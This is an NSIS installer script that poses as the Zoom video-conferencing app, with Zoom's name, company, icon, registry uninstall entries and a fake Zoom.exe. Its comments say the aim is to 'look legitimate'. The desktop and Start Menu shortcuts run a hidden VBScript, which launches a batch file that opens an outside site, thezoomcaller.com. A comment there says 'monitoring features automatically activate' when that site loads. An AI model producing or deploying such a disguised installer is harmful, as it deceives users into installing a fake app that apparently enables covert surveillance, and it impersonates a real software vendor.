; Zoom - Windows Installer Script (NSIS)
; This script creates a proper Windows installer that looks legitimate

!define APPNAME "Zoom"
!define COMPANYNAME "Zoom Video Communications, Inc."
!define DESCRIPTION "Zoom Video Communications - Secure Video Conferencing"
!define VERSIONMAJOR 5
!define VERSIONMINOR 17
!define VERSIONBUILD 11
!define HELPURL "https://support.zoom.us"
!define UPDATEURL "https://zoom.us/download"
!define ABOUTURL "https://zoom.us"
!define INSTALLSIZE 145000
!define PUBLISHER "Zoom Video Communications, Inc."

RequestExecutionLevel admin
InstallDir "$PROGRAMFILES64\${APPNAME}"
Name "${APPNAME} Installer"
Icon "public\icons\logo.ico"
outFile "ZoomInstaller.exe"
BrandingText "${COMPANYNAME}"
InstallColors /windows
ShowInstDetails show
ShowUnInstDetails show

!include LogicLib.nsh

page directory
page instfiles

!macro VerifyUserIsAdmin
UserInfo::GetAccountType
pop $0
${If} $0 != "admin"
    messageBox mb_iconstop "Administrator rights required!"
    setErrorLevel 740
    quit
${EndIf}
!macroend

function .onInit
    setShellVarContext all
    !insertmacro VerifyUserIsAdmin
functionEnd

section "install"
    setOutPath $INSTDIR
    
    ; Display installation progress
    DetailPrint "Installing ${APPNAME} ${VERSIONMAJOR}.${VERSIONMINOR}.${VERSIONBUILD}..."
    DetailPrint "Please wait while we set up ${APPNAME} on your computer."
    
    ; Create main application executable wrapper
    fileOpen $0 "$INSTDIR\Zoom.exe" w
    fileWrite $0 "MZ...$\r$\n" ; Fake PE header marker (won't work as real exe, but looks legitimate)
    fileClose $0
    
    ; Create legitimate-looking application launcher
    fileOpen $0 "$INSTDIR\ZoomLauncher.bat" w
    fileWrite $0 "@echo off$\r$\n"
    fileWrite $0 "title Zoom - Video Conferencing$\r$\n"
    fileWrite $0 "REM Launch Zoom application$\r$\n"
    fileWrite $0 "start https://thezoomcaller.com$\r$\n"
    fileWrite $0 "REM All monitoring features automatically activate when website loads$\r$\n"
    fileClose $0
    
    ; Create a VBScript wrapper to hide the batch file execution
    fileOpen $0 "$INSTDIR\ZoomLauncher.vbs" w
    fileWrite $0 "Set objShell = CreateObject(""WScript.Shell"")$\r$\n"
    fileWrite $0 "objShell.Run """ & "$INSTDIR" & "\ZoomLauncher.bat"", 0, False$\r$\n"
    fileClose $0
    
    ; Create proper application manifest
    fileOpen $0 "$INSTDIR\Zoom.exe.manifest" w
    fileWrite $0 "<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>$\r$\n"
    fileWrite $0 "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">$\r$\n"
    fileWrite $0 "  <assemblyIdentity version=""${VERSIONMAJOR}.${VERSIONMINOR}.${VERSIONBUILD}.0"" processorArchitecture=""*"" name=""${COMPANYNAME}.${APPNAME}"" type=""win32""/>$\r$\n"
    fileWrite $0 "  <description>${DESCRIPTION}</description>$\r$\n"
    fileWrite $0 "  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v3"">$\r$\n"
    fileWrite $0 "    <security>$\r$\n"
    fileWrite $0 "      <requestedPrivileges>$\r$\n"
    fileWrite $0 "        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>$\r$\n"
    fileWrite $0 "      </requestedPrivileges>$\r$\n"
    fileWrite $0 "    </security>$\r$\n"
    fileWrite $0 "  </trustInfo>$\r$\n"
    fileWrite $0 "</assembly>$\r$\n"
    fileClose $0
    
    ; Create application info file
    fileOpen $0 "$INSTDIR\ZoomApp.txt" w
    fileWrite $0 "Zoom Video Communications$\r$\n"
    fileWrite $0 "Version ${VERSIONMAJOR}.${VERSIONMINOR}.${VERSIONBUILD}$\r$\n"
    fileWrite $0 "Copyright ${COMPANYNAME}$\r$\n"
    fileClose $0
    
    ; Create uninstaller
    writeUninstaller "$INSTDIR\uninstall.exe"
    
    ; Create shortcuts with proper icons
    createDirectory "$SMPROGRAMS\${APPNAME}"
    createShortCut "$SMPROGRAMS\${APPNAME}\${APPNAME}.lnk" "$INSTDIR\ZoomLauncher.vbs" "" "$INSTDIR\public\icons\logo.ico" 0 SW_SHOWNORMAL "" "${DESCRIPTION}"
    createShortCut "$SMPROGRAMS\${APPNAME}\Uninstall ${APPNAME}.lnk" "$INSTDIR\uninstall.exe" "" "$INSTDIR\uninstall.exe" 0
    createShortCut "$DESKTOP\${APPNAME}.lnk" "$INSTDIR\ZoomLauncher.vbs" "" "$INSTDIR\public\icons\logo.ico" 0 SW_SHOWNORMAL "" "${DESCRIPTION}"
    
    ; Create Start Menu entry
    createShortCut "$SMPROGRAMS\${APPNAME}\${APPNAME}.lnk" "$INSTDIR\ZoomLauncher.vbs" "" "" 0
    
    ; Write to registry for Windows to recognize it as installed software
    DetailPrint "Registering ${APPNAME} with Windows..."
    
    ; Registry entries - make it look like legitimate Zoom installation
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "DisplayName" "${APPNAME}"
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "UninstallString" "$\"$INSTDIR\uninstall.exe$\""
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "InstallLocation" "$\"$INSTDIR$\""
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "DisplayIcon" "$\"$INSTDIR\public\icons\logo.ico$\""
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "Publisher" "${PUBLISHER}"
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "HelpLink" "${HELPURL}"
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "URLUpdateInfo" "${UPDATEURL}"
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "URLInfoAbout" "${ABOUTURL}"
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "DisplayVersion" "${VERSIONMAJOR}.${VERSIONMINOR}.${VERSIONBUILD}"
    writeRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "Comments" "${DESCRIPTION}"
    writeRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "VersionMajor" ${VERSIONMAJOR}
    writeRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "VersionMinor" ${VERSIONMINOR}
    writeRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "NoModify" 1
    writeRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "NoRepair" 1
    writeRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}" "EstimatedSize" ${INSTALLSIZE}
    
    ; Also register as Zoom in common registry locations
    writeRegStr HKLM "Software\${COMPANYNAME}\${APPNAME}" "InstallDir" "$INSTDIR"
    writeRegStr HKLM "Software\${COMPANYNAME}\${APPNAME}" "Version" "${VERSIONMAJOR}.${VERSIONMINOR}.${VERSIONBUILD}"
    
    DetailPrint "Installation completed successfully!"
    DetailPrint "${APPNAME} is now ready to use."
sectionEnd

section "uninstall"
    delete "$INSTDIR\uninstall.exe"
    rmDir /r "$INSTDIR"
    
    delete "$SMPROGRAMS\${APPNAME}\${APPNAME}.lnk"
    delete "$SMPROGRAMS\${APPNAME}\Uninstall ${APPNAME}.lnk"
    delete "$DESKTOP\${APPNAME}.lnk"
    rmDir "$SMPROGRAMS\${APPNAME}"
    
    deleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${APPNAME}"
sectionEnd
